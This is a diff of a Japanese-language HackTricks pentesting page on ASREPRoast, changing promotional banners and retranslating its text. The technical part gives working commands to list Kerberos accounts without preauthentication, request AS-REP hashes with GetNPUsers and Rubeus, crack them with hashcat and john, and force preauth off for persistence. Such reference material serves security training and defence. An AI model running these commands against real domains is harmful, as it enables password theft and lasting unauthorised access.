@@ -2,55 +2,59 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProofはすべての暗号バグバウンティの場所です。**
+経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！
 
-**遅延なしで報酬を受け取る**\
-HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。
+**ハッキングの洞察**\
+ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する
 
-**web3ペンテストの経験を積む**\
-ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。
+**リアルタイムハックニュース**\
+リアルタイムのニュースと洞察を通じて、速いペースのハッキングの世界を最新の状態に保つ
 
-**web3ハッカーレジェンドになる**\
-各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
+**最新の発表**\
+新しいバグバウンティの開始と重要なプラットフォームの更新情報を入手する
 
-[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！
-
-{% embed url="https://hackenproof.com/register" %}
+**今日から** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **に参加して、トップハッカーとのコラボレーションを始めましょう！**
 
 ## ASREPRoast
 
-ASREPRoast攻撃は、**Kerberosの事前認証が必要な属性（[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**）を持たないユーザー**を探します。
+ASREPRoast攻撃は、**Kerberos事前認証が必要でない属性を持つユーザー**（[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**）**を探します。
 
-つまり、これらのユーザーのいずれかを代表してDCにAS\_REQリクエストを送信し、AS\_REPメッセージを受け取ることができます。この最後のメッセージには、パスワードから派生した元のユーザーキーで暗号化されたデータのチャンクが含まれています。その後、このメッセージを使用して、ユーザーパスワードをオフラインでクラックすることができます。
+これは、誰でもそれらのユーザーの代わりにDCにAS\_REQリクエストを送信し、AS\_REPメッセージを受け取ることができることを意味します。この最後の種類のメッセージには、元のユーザーキーで暗号化されたデータのチャンクが含まれており、そのキーはユーザーのパスワードから派生しています。このメッセージを使用して、ユーザーパスワードをオフラインでクラックすることができます。
 
-さらに、**この攻撃を実行するためにはドメインアカウントは必要ありません**。DCへの接続のみが必要です。ただし、**ドメインアカウントがある場合**、ドメイン内の**Kerberosの事前認証が必要なユーザー**を取得するためにLDAPクエリを使用できます。**それ以外の場合はユーザー名を推測する必要があります**。
+さらに、この攻撃を実行するために**ドメインアカウントは必要ありません**。DCへの接続のみが必要です。しかし、**ドメインアカウントがある場合**、LDAPクエリを使用してドメイン内の**Kerberos事前認証がないユーザーを取得**することができます。**そうでなければユーザー名を推測する必要があります**。
 
-#### 脆弱なユーザーの列挙（ドメインの資格情報が必要）
+#### 脆弱なユーザーの列挙（ドメイン資格情報が必要）
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
 #### AS\_REPメッセージのリクエスト
 
-{% code title="Linuxを使用する場合" %}
+{% code title="Linux使用時" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% code title="Windowsを使用する" %}
+```
+{% endcode %}
+
+{% code title="Windowsを使用する場合" %}
+```
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
@@ -58,7 +62,7 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-Rubeusを使用したAS-REP Roastingは、暗号化タイプ0x17および事前認証タイプ0の4768を生成します。
+Rubeusを使用したAS-REP Roastingは、暗号化タイプが0x17で、preauthタイプが0の4768を生成します。
 {% endhint %}
 
 ### クラッキング
@@ -66,41 +70,41 @@ Rubeusを使用したAS-REP Roastingは、暗号化タイプ0x17および事前�
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### 持続性
+### 永続性
 
-**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、**preauth** の強制は必要ありません。
+**GenericAll** 権限（またはプロパティ書き込み権限）を持っているユーザーに対して、**preauth** が不要になるように強制します：
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 ## 参考文献
 
-[**AS-REP Roastingについての詳細情報は、ired.teamを参照してください**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+[**AS-REPロースティングについての詳細情報はired.teamで**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProofはすべての暗号バグバウンティの場所です。**
+経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！
 
-**遅延なしで報酬を受け取る**\
-HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。
+**ハッキングの洞察**\
+ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する
 
-**Web3ペントestingの経験を積む**\
-ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！成長するWeb3セキュリティをマスターしましょう。
+**リアルタイムハックニュース**\
+リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ
 
-**Web3ハッカーレジェンドになる**\
-各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
+**最新の発表**\
+新しいバグバウンティの開始や重要なプラットフォームの更新情報を入手する
 
-[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！
-
-{% embed url="https://hackenproof.com/register" %}
+[**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、今日からトップハッカーと協力しましょう！
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローになる方法を学ぶ</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
+* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。
 
 </details>
